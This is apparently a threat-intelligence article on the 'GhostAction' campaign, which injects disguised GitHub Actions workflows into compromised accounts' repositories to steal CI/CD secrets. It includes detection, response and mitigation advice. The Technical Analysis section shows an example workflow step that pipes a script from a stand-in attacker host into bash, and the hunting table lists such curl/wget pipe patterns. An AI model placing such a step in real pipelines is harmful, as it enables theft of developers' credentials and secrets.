# GhostAction Campaign Compromises 1,900 GitHub Accounts, Targets 30k Repos

**Severity:** high | **Category:** Supply Chain Attack,Threat Actor,Cloud Security | **Updated:** 2026-10-15 | **Reading time:** 5 min

The 'GhostAction' credential theft campaign has escalated, compromising approximately 1,900 GitHub user accounts to target over 30,000 software repositories. The attackers inject malicious GitHub Actions workflows into projects to steal CI/CD secrets, cloud credentials, and API keys. The latest wave of attacks, observed in October 2026, includes new functionality to scan a repository's entire Git history for hardcoded secrets, expanding the scope of potential data theft.

## Executive Summary
The **[supply chain attack](https://en.wikipedia.org/wiki/Supply_chain_attack)** campaign known as **GhostAction** has seen a significant resurgence, compromising an estimated 1,900 **[GitHub](https://github.com/)** developer accounts. The attackers leverage this access to inject malicious code into over 30,000 software repositories, affecting 3,000 users and organizations. The campaign's primary objective is to steal sensitive secrets from CI/CD environments, including cloud provider credentials (e.g., **[AWS](https://aws.amazon.com/)** keys), package registry tokens (npm, PyPI), and API keys. This large-scale operation highlights the increasing targeting of developer infrastructure as a lucrative vector for initial access and data theft.

---

## Threat Overview
**GhostAction** is a credential-theft campaign that has been active since at least September 2025. The threat actors focus on compromising the software supply chain by targeting developers and their **[GitHub](https://github.com/)** accounts. The typical attack pattern involves using stolen credentials, such as Personal Access Tokens (PATs) obtained from information-stealer malware logs or previous data breaches, to gain unauthorized access to a developer's account.

Once in control, the attackers inject a malicious **[GitHub Actions](https://github.com/features/actions)** workflow into one or more of the developer's repositories. These workflows are often disguised with benign-sounding names like `security-audit.yml` or `github_actions_security.yml` to evade detection. When the workflow is triggered (e.g., by a push event), it executes the malicious code within the context of the repository's CI/CD pipeline, giving it access to all the secrets and environment variables configured for that project.

---

## Technical Analysis
The malicious GitHub Actions workflows are designed to exfiltrate secrets. The core of the payload typically involves a script that collects all available environment variables and secrets within the GitHub Actions runner and sends them to an attacker-controlled server. 

Recent analysis by GitGuardian has revealed new TTPs in the latest wave of attacks (since August 2026):
- **History Scanning:** A new feature has been added to the malicious workflow that scans the entire Git history of the compromised repository. The script uses regular expressions to search for patterns matching common secret formats, such as **[AWS](https://aws.amazon.com/)** keys (`AKIA...`), **[GitHub](https://github.com/)** tokens, and other API keys that may have been accidentally committed in the past.
- **Payload Evolution:** The attackers are observed to be experimenting and modifying their payloads over time, indicating an active and ongoing development process.

An example of a malicious workflow step might look like this:
```yaml
- name: Run audit
  run: |
    curl -s http://attacker-domain.com/payload.sh | bash
```
This simple step downloads and executes a script from an external server, which then carries out the secret-stealing and history-scanning logic.

---

## Impact Assessment
The compromise of CI/CD secrets poses a severe risk to organizations. Stolen credentials can lead to:
- **Cloud Infrastructure Compromise:** Attackers can use stolen **[AWS](https://aws.amazon.com/)**, Azure, or GCP keys to access, modify, or destroy cloud resources, leading to significant financial loss and operational downtime.
- **Further Supply Chain Attacks:** Stolen package registry tokens (npm, PyPI) can be used to publish malicious versions of software packages, propagating the attack to downstream users.
- **Data Breaches:** Access to production databases or other sensitive services via stolen API keys can result in major data breaches.
- **Code Tampering:** Attackers with write access to repositories can inject backdoors or other malicious code directly into the application source.

---

## IOCs — Directly from Articles
No specific Indicators of Compromise (IOCs) such as exfiltration domains or payload hashes were mentioned in the source articles.

---

## Cyber Observables — Hunting Hints
Security teams can hunt for GhostAction activity by monitoring for the following patterns in their GitHub organizations. The following patterns could indicate related activity:

| Type | Value | Description |
|---|---|---|
| file_name | `security-audit.yml`, `github_actions_security.yml` | Suspiciously named workflow files added to the `.github/workflows/` directory. |
| command_line_pattern | `curl ... | bash`, `wget ... | sh` | GitHub Actions steps that pipe scripts directly from the internet into a shell are highly suspicious. |
| log_source | GitHub Audit Logs | Monitor for logins from unusual locations or IP addresses, followed by repository write activity. |
| other | Unexpected commits by a user | A commit adding a new workflow file from a user account outside of their normal working hours or from an unfamiliar IP. |

---

## Detection & Response
**Detection:**
1.  **Monitor Workflow Changes:** Implement alerting for any new or modified files in the `.github/workflows/` directory of all repositories. All changes to CI/CD pipelines should go through a mandatory peer review process. ([D3-SFA: System File Analysis](https://d3fend.mitre.org/technique/d3f:SystemFileAnalysis))
2.  **Audit Log Analysis:** Regularly review **[GitHub](https://github.com/)** audit logs for suspicious activity, such as PAT creation/usage from anomalous IPs or bulk repository modifications. ([D3-DAM: Domain Account Monitoring](https://d3fend.mitre.org/technique/d3f:DomainAccountMonitoring))
3.  **Secrets Scanning:** Proactively and continuously scan all repositories and their full Git history for secrets to find and remediate them before attackers do.

**Response:**
1.  **Revoke Credentials:** If a compromise is suspected, immediately revoke the compromised user's PATs, rotate their password, and terminate all active sessions.
2.  **Remove Malicious Workflow:** Delete the malicious workflow file from the repository.
3.  **Rotate All Exposed Secrets:** This is the most critical step. Any secret that was available to the compromised repository's Actions environment must be considered stolen and must be revoked and replaced immediately.

---

## Mitigation
1.  **Enforce MFA:** Mandate the use of Multi-Factor Authentication (MFA) for all **[GitHub](https://github.com/)** users in your organization to prevent account takeovers via stolen passwords. ([M1032: Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032/))
2.  **Use Short-Lived PATs:** Avoid using classic Personal Access Tokens that do not expire. Instead, use fine-grained PATs with a short expiration date (e.g., 7-30 days) and scope them to the minimum required permissions. ([M1026: Privileged Account Management](https://attack.mitre.org/mitigations/M1026/))
3.  **Restrict Workflow Permissions:** Configure **[GitHub Actions](https://github.com/features/actions)** to have read-only permissions by default and only grant write permissions when explicitly necessary. This can limit the blast radius of a compromised workflow.
4.  **Use OIDC:** Whenever possible, use OpenID Connect (OIDC) to authenticate with cloud providers like **[AWS](https://aws.amazon.com/)**, Azure, and GCP. This avoids the need to store long-lived cloud secrets in GitHub. ([M1043: Credential Access Protection](https://attack.mitre.org/mitigations/M1043/))

**Tags:** GhostAction, GitHub, GitHub Actions, Supply Chain Attack, CI/CD, Credential Theft

## Sources
- [GhostAction Compromises About 1,900 GitHub Accounts, Targets Over 30,000 Repositories](https://thehackernews.com/2026/10/ghostaction-compromises-about-1900.html) — The Hacker News
- [Weekly Threat Brief for October 14, 2026](https://www.pinpointsecurity.io/this-week-in-security-ai-agents-supply-chain-attacks-and-critical-patches/) — Pinpoint Security

---
Source: https://cyber.netsecops.io/articles/ghostaction-supply-chain-campaign-compromises-1900-github-accounts/
